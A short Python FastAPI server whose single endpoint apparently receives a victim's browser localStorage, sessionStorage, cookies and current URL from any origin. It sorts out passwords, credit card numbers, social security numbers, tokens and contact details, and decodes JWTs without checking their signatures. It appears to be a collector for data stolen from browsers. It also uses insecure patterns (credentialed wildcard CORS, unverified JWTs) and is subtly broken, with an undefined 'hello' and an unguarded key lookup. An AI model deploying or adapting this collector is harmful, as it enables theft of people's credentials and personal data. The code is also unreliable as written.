from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Dict, Any
import jwt


app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

class KeyValue(BaseModel):
    key: str
    value: Any

class Payload(BaseModel):
    localStorageData: List[KeyValue]
    sessionStorageData: List[KeyValue]
    cookies: List[KeyValue]
    currentUrl: str

SENSITIVE_KEYS = {
    "password",
    "creditCard",
    "ssn",
    "token",
    "authToken",
    "refreshToken",
    "userData",
    "personalInfo",
    "email",
    "phoneNumber"
}

def decode_jwt(token: str) -> Dict[str, Any]:
    try:
        decoded = jwt.decode(token, options={"verify_signature": False}) 
        print(decoded)
        return decoded

    except jwt.DecodeError:
        return {}

@app.post("/")
async def root(payload: Payload     ):
    sensitive_data = []
    non_sensitive_data = []

    for item in payload.localStorageData + payload.sessionStorageData + payload.cookies:
        if item.key in SENSITIVE_KEYS:
            sensitive_data.append(item)
        else:
            non_sensitive_data.append(item)
    
    # print("Current URL:", payload.currentUrl)
    # print("Sensitive Data:", sensitive_data)
    # print("Non-Sensitive Data:", non_sensitive_data)
    token = None
    for item in sensitive_data:
        if item.key == "token":
            token = item.value
            break
    
    decoded_token = {}
    if token:
        # Decode the JWT token
        decoded_token = decode_jwt(token)    
    response_data = {
        "message": hello + decoded_token['name'],
        "sensitive_data": sensitive_data,
        "non_sensitive_data": non_sensitive_data,
        "decoded_token": decoded_token
    }
    # print(response_data)
    
    return response_data